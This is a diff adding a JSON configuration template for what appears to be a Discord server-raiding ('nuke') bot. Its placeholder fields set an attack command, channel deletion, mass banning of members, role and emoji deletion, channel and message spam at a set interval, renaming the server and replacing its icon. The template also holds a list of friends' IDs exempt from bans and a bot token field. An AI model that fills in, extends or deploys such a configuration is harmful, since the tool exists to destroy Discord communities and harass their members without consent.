@@ -1,0 +1,19 @@
+{
+    "activity": "BOT ACTIVITY TEXT",
+    "commanddestroy": "COMMAND LAUNCH ATTACK",
+    "channelname": "CHANNEL NAME",
+    "channelmessage": "CHANNEL MESSAGE",
+    "channelinterval": "INTERVAL CREATECHANNE + SENDMESSAGE (MS) 1000ms = 1s",
+    "discordname": "NAME OF DISCORD",
+    "discordicon": "ICON OF DISCORD",
+    "deletechannel": "true IF YOU WANT false IF YOU DONT WANT",
+    "banmembers": "true IF YOU WANT false IF YOU DONT WANT",
+    "deleteroles": "true IF YOU WANT false IF YOU DONT WANT",
+    "deleteemoji": "true IF YOU WANT false IF YOU DONT WANT",
+    "createchannelspam": "true IF YOU WANT false IF YOU DONT WANT",
+    "renamediscord": "true IF YOU WANT false IF YOU DONT WANT",
+    "imagediscord": "true IF YOU WANT false IF YOU DONT WANT",
+    "nobaniddiscord": ["ID OF YOUR FRIENDS", "ID OF YOUR FRIENDS"],
+    "token": "TOKEN OF BOT"
+
+}
